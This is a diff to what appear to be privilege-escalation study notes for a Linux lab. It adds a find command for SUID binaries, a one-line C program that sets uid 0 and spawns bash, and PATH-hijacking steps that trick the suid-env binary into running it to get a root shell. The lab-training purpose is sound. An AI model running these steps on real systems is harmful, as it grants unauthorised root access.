@@ -513,7 +513,11 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 /usr/local/bin/suid-so
 ````
 - It will be an euid=0 not a uid=0!!!
-### SUID and SGID Executables-Environment Variables
+### SUID and SGID Environment Variables
+- Detection
+````
+find / -type f -perm -04000 -ls 2>/dev/null
+````
 - The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
 - First, execute the file and note that it seems to be trying to start the apache2 webserver:
 ````
@@ -523,14 +527,22 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 ````
 strings /usr/local/bin/suid-env
 ````
-One line `service apache2 start` suggests that the service executable is being called to start the webserver, however the full path of the executable `/usr/sbin/service` is not being used.
-Compile the code `service.c` into an executable called service. This code simply spawns a Bash shell:
+- One line `service apache2 start` suggests that the service executable is being called to start the webserver, however the full path of the executable `/usr/sbin/service` is not being used.
 ````
-gcc -o service /home/user/tools/suid/service.c
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+````
+- Compile the code `service.c` into an executable called service. This code simply spawns a Bash shell:
+````
+gcc /tmp/service.c -o /tmp/service
 ````
 - Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
 ````
-PATH=.:$PATH /usr/local/bin/suid-env
+export PATH=/tmp:$PATH
+````
+- Rin the executable with an absolute path
+````
+/usr/local/bin/suid-env
+id
 ````
 ### SUID and SGID Executables-Abusing Shell Features 1
 - The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable `/usr/sbin/service` to start the apache2 webserver.
